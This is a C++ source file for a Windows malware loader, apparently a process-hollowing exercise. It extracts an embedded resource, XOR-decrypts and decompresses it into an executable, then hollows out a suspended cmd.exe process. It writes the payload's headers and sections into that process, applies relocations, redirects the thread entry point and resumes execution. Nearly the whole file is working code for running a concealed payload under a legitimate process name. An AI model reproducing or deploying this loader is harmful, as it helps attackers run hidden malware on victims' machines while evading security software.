#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include "resource.h"
#include <winternl.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <zlib.h>
#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);

typedef struct IMAGE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, * PIMAGE_RELOCATION_ENTRY;

int _tmain(void*)
{
	HRSRC hRes;         // handle to resource
	HGLOBAL hResLoad;   // handle to loaded resource
	LPVOID lpResLock;   // pointer to resource data
	unsigned char* rawPayload;

	// Find the resource
	hRes = FindResource(NULL, MAKEINTRESOURCE(rawPAYLOAD), RT_RCDATA);
	if (!hRes) {
		_tprintf(L"FindResource failed:%d\n", GetLastError());
		return 1;
	}
	DWORD payloadSize = SizeofResource(NULL, hRes);
	// Load the resource into memory
	hResLoad = LoadResource(NULL, hRes);
	// Return a pointer to resource in memory
	if (!hResLoad) {
		_tprintf(L"LoadResource failed:%d\n", GetLastError());
		return 1;
	}
	lpResLock = LockResource(hResLoad);

	_tprintf(_T("Resource loaded at %p\n"), lpResLock);

	// Copy the read-only memory to buffer
	rawPayload = (unsigned char*)malloc(payloadSize);
	if (!rawPayload) {
		_tprintf(L"Memory allocation failed\n");
		return 1;
	}
	memcpy(rawPayload, lpResLock, payloadSize);

	unsigned char* decryptPayload = rawPayload;

	// Decrypt the payload
	for (DWORD i = 0; i < payloadSize; i++) {
		decryptPayload[i] = rawPayload[i] ^ 0x2c;
	}

	uLongf originalPESize = 100 * 1024; // Assume the original PE size will not exceed 100KB
	unsigned char* originalPE = (unsigned char*)malloc(originalPESize);
	if (!originalPE) {
		_tprintf(L"Memory allocation failed\n");
		return 1;
	}

	// Decompress the payload
	int res = uncompress(originalPE, &originalPESize, decryptPayload, payloadSize);
	if (res != Z_OK) {
		_tprintf(L"Decompress failed: %d\n", res);
		free(originalPE);
		return 1;
	}
	/*
		Process Hollowing Technique
		This part is following to https://www.aon.com/en/insights/cyber-labs/apt-x-process-hollowing and https://github.com/adamhlt/Process-Hollowing :)
	*/
	// I.Prepare Payload Executable (skipped, done above)
	// II. Spawn Victim Process
	LPSTARTUPINFO pVictimStartupInfo = new STARTUPINFO();
	LPPROCESS_INFORMATION pVictimProcessInfo = new PROCESS_INFORMATION();

	// Victim Image has to be same subsystem with payload image
	LPWSTR victimImage = _wcsdup(L"C:\\Windows\\System32\\cmd.exe");

	if (!CreateProcessW(NULL, victimImage, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, pVictimStartupInfo, pVictimProcessInfo))
	{
		_tprintf(L"CreateProcess failed: %d\n", GetLastError());
		return 1;
	}
	_tprintf(_T("Victim process created with PID: %d\n"), pVictimProcessInfo->dwProcessId);

	// III.Load Portable Executable

	// Allocate memory for payload
	PVOID pPayloadImage = VirtualAlloc(0, originalPESize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pPayloadImage) {
		printf("[-] VirtualAlloc failed %d\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}
	// Copy PE into allocated memory
	memcpy(pPayloadImage, originalPE, originalPESize);

	_tprintf(L"[+] Payload after decompressing\n");
	_tprintf(L"\t[*] Size %u bytes\n", originalPESize);
	_tprintf(L"[+] Read payload into memory\r\n");
	_tprintf(L"\t[*] In current process at 0x%p\n", pPayloadImage);

	// IV.Hollow Out Victim Image

	/*
	*	Note:
	*	x86: EBX = PEB, EAX = EntryPoint
	*	x64: Rcx = EntryPoint, PEB from NtQueryInformationProcess
	*/

	// Obtain context / register contents of victim process's primary thread
	CONTEXT victimContext = { 0 };
	victimContext.ContextFlags = CONTEXT_FULL;
	ULONG len;

	PROCESS_BASIC_INFORMATION victimProcessBasicInfo = { 0 };
	GetThreadContext(pVictimProcessInfo->hThread, &victimContext);
	NtQueryInformationProcess(pVictimProcessInfo->hProcess, ProcessBasicInformation, &victimProcessBasicInfo, sizeof(victimProcessBasicInfo), &len);

	_tprintf(L"[+] Obtained context from victim process's primary thread\r\n");
	_tprintf(L"\t[*] Victim PEB address = 0x%016llx\n", (ULONG64)victimProcessBasicInfo.PebBaseAddress);

	/*
	* The value of Rip return ntdll!RtlUserThreadStart
	* RtlUserThreadStart is a function often associated with threads, specifically serving as the start address for new user-mode threads.
	*/

	_tprintf(L"\t[*] Victim entry point / RIP = 0x%016llx\n", (ULONG64)victimContext.Rip);

	// Get base address of the victim executable
	PVOID pVictimImageBaseAddress;
	ReadProcessMemory(pVictimProcessInfo->hProcess, (PVOID)((ULONG64)victimProcessBasicInfo.PebBaseAddress + 0x10), &pVictimImageBaseAddress, sizeof(PVOID), 0);
	_tprintf(L"[+] Extracted image base address of victim process\r\n");
	_tprintf(L"\t[*] Address: 0x%016llx\n", (ULONG64)pVictimImageBaseAddress);

	// V.Allocate Memory in Victim Process

	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pPayloadImage;
	PIMAGE_NT_HEADERS64 pNTHeaders = (PIMAGE_NT_HEADERS64)((LPBYTE)pPayloadImage + pDOSHeader->e_lfanew);
	ULONGLONG payloadImageBaseAddress = pNTHeaders->OptionalHeader.ImageBase;
	DWORD sizeOfPayloadImage = pNTHeaders->OptionalHeader.SizeOfImage;
	_tprintf(L"[+] Payload image metadata extracted\r\n");
	_tprintf(L"\t[*] payloadImageBaseAddress = 0x%016x\r\n", (UINT)payloadImageBaseAddress);
	_tprintf(L"\t[*] Payload process entry point = 0x%016x\r\n", (UINT)pNTHeaders->OptionalHeader.AddressOfEntryPoint);

	// check if the source image has a relocation table
	BOOL bHasReloc = FALSE;
	if (pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		bHasReloc = TRUE;

	// VI.Inject Code into Victim Process

	if (!bHasReloc) {

		// Allocate memory for the payload image in the remote process
		// if it does not have .reloc section uses the preferred image base.
		PVOID pVictimHollowedAllocation = VirtualAllocEx(pVictimProcessInfo->hProcess, (PVOID)payloadImageBaseAddress, sizeOfPayloadImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!pVictimHollowedAllocation) {
			printf("[-] Unable to allocate memory in victim process %i\r\n", GetLastError());
			TerminateProcess(pVictimProcessInfo->hProcess, 1);
			return 1;
		}
		_tprintf(L"[+] Allocated memory in victim process\r\n");
		_tprintf(L"\t[*] pVictimHollowedAllocation = 0x%016llx\r\n", (ULONG64)pVictimHollowedAllocation);

		// Write PE header into victim process
		WriteProcessMemory(pVictimProcessInfo->hProcess, (PVOID)pVictimHollowedAllocation, pPayloadImage, pNTHeaders->OptionalHeader.SizeOfHeaders, 0);
		_tprintf(L"\t[*] Headers written into victim process\r\n");
		// Write PE sections into victim process
		for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
			PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pPayloadImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
			// Copy raw bytes of each section from PE file into the allocated memory at the correct RVA
			WriteProcessMemory(pVictimProcessInfo->hProcess, (PVOID)((LPBYTE)pVictimHollowedAllocation + pSectionHeader->VirtualAddress), (PVOID)((LPBYTE)pPayloadImage + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, 0);
			_tprintf(L"\t[*] Section %hs written into victim process at 0x%016llx\r\n", pSectionHeader->Name, (ULONG64)pVictimHollowedAllocation + pSectionHeader->VirtualAddress);
			_tprintf(L"\t\t[*] Replacement section header virtual address: 0x%016x\r\n", (UINT)pSectionHeader->VirtualAddress);
			_tprintf(L"\t\t[*] Replacement section header pointer to raw data: 0x%016x\r\n", (UINT)pSectionHeader->PointerToRawData);
		}
		WriteProcessMemory(pVictimProcessInfo->hProcess, (PVOID)((ULONG64)victimProcessBasicInfo.PebBaseAddress + 0x10), &pNTHeaders->OptionalHeader.ImageBase, sizeof(DWORD64), 0);

		// VII. Rewire Victim Process
		// Set victim process entry point to payload image's entry point
		victimContext.Rcx = (SIZE_T)((LPBYTE)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
		SetThreadContext(pVictimProcessInfo->hThread, &victimContext);
		_tprintf(L"[+] Victim process entry point set to payload image entry point in RCX register\n");
		_tprintf(L"\t[*] Value is 0x%016llx\r\n", (ULONG64)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
		_tprintf(L"[+] Resuming victim process primary thread...\n");

		ResumeThread(pVictimProcessInfo->hThread);
	}
	else
	{
		// Unmap executable image from victim process    
		DWORD dwResult = NtUnmapViewOfSection(pVictimProcessInfo->hProcess, pVictimImageBaseAddress);
		if (dwResult) {
			_tprintf(L"[-] Error unmapping section in victim process\r\n");
			TerminateProcess(pVictimProcessInfo->hProcess, 1);
			return 1;
		}
		_tprintf(L"[+] Hollowed out victim executable via NtUnmapViewOfSection\r\n");
		_tprintf(L"\t[*] Utilized base address of 0x%016llx\r\n", (ULONG64)pVictimImageBaseAddress);

		// Allocate memory for the payload image in the remote process
		PVOID pVictimHollowedAllocation = VirtualAllocEx(pVictimProcessInfo->hProcess, pVictimImageBaseAddress, sizeOfPayloadImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!pVictimHollowedAllocation) {
			printf("[-] Unable to allocate memory in victim process %i\r\n", GetLastError());
			TerminateProcess(pVictimProcessInfo->hProcess, 1);
			return 1;
		}
		_tprintf(L"[+] Allocated memory in victim process\r\n");
		_tprintf(L"\t[*] pVictimHollowedAllocation = 0x%016llx\r\n", (ULONG64)pVictimHollowedAllocation);

		// Calculate the delta between the preferred image base and the actual allocated base
		const DWORD64 DeltaImageBase = (DWORD64)pVictimHollowedAllocation - pNTHeaders->OptionalHeader.ImageBase;

		pNTHeaders->OptionalHeader.ImageBase = (DWORD64)pVictimHollowedAllocation;

		// Write PE header into victim process
		WriteProcessMemory(pVictimProcessInfo->hProcess, (PVOID)pVictimHollowedAllocation, pPayloadImage, pNTHeaders->OptionalHeader.SizeOfHeaders, 0);

		const IMAGE_DATA_DIRECTORY payloadImageDataReloc = pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		PIMAGE_SECTION_HEADER pPayloadImageRelocSection = nullptr;

		// Write PE process sections into victim process
		for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
			PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pPayloadImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
			// Find the relocation section
			if (payloadImageDataReloc.VirtualAddress >= pSectionHeader->VirtualAddress && payloadImageDataReloc.VirtualAddress < (pSectionHeader->VirtualAddress + pSectionHeader->Misc.VirtualSize))
				pPayloadImageRelocSection = pSectionHeader;
			// Copy raw bytes of each section from PE file into the allocated memory at the correct RVA
			WriteProcessMemory(pVictimProcessInfo->hProcess, (PVOID)((LPBYTE)pVictimHollowedAllocation + pSectionHeader->VirtualAddress), (PVOID)((LPBYTE)pPayloadImage + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, 0);
			_tprintf(L"\t[*] Section %hs written into victim process at 0x%016llx\r\n", pSectionHeader->Name, (ULONG64)pVictimHollowedAllocation + pSectionHeader->VirtualAddress);
			_tprintf(L"\t\t[*] Replacement section header virtual address: 0x%016x\r\n", (UINT)pSectionHeader->VirtualAddress);
			_tprintf(L"\t\t[*] Replacement section header pointer to raw data: 0x%016x\r\n", (UINT)pSectionHeader->PointerToRawData);
		}

		if (pPayloadImageRelocSection == nullptr)
		{
			_tprintf(L"[-] An error is occured when trying to get the relocation section of the source image.\n");
			return 1;
		}

		DWORD RelocOffset = 0;
		// Walk through all relocation blocks 
		while (RelocOffset < payloadImageDataReloc.Size)
		{
			const PIMAGE_BASE_RELOCATION pImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)pPayloadImage + pPayloadImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
			// Number of relocation entries in this block
			const DWORD NumberOfEntries = (pImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
			// Process each entry
			for (DWORD i = 0; i < NumberOfEntries; i++)
			{
				const PIMAGE_RELOCATION_ENTRY pImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)pPayloadImage + pPayloadImageRelocSection->PointerToRawData + RelocOffset);
				RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY); // skip padding
				if (pImageRelocationEntry->Type == 0)
					continue;
				// Target address inside victim process
				const DWORD64 AddressLocation = (DWORD64)pVictimHollowedAllocation + pImageBaseRelocation->VirtualAddress + pImageRelocationEntry->Offset;
				DWORD64 PatchedAddress = 0;

				ReadProcessMemory(pVictimProcessInfo->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), 0);

				PatchedAddress += DeltaImageBase;

				WriteProcessMemory(pVictimProcessInfo->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), 0);
			}
		}
		WriteProcessMemory(pVictimProcessInfo->hProcess, (PVOID)((ULONG64)victimProcessBasicInfo.PebBaseAddress + 0x10), &pNTHeaders->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
		// VII. Rewire Victim Process
		// Set victim process entry point to payload image's entry point
		victimContext.Rcx = (SIZE_T)((LPBYTE)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
		SetThreadContext(pVictimProcessInfo->hThread, &victimContext);
		_tprintf(L"[+] Victim process entry point set to payload image entry point in RCX register\n");
		_tprintf(L"\t[*] Value is 0x%016x\r\n", (UINT)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
		_tprintf(L"[+] Resuming victim process primary thread...\n");

		ResumeThread(pVictimProcessInfo->hThread);
	}

	_tprintf(L"[+] Cleaning up\n");
	CloseHandle(pVictimProcessInfo->hThread);
	CloseHandle(pVictimProcessInfo->hProcess);
	VirtualFree(pPayloadImage, 0, MEM_RELEASE);

	return 0;
}


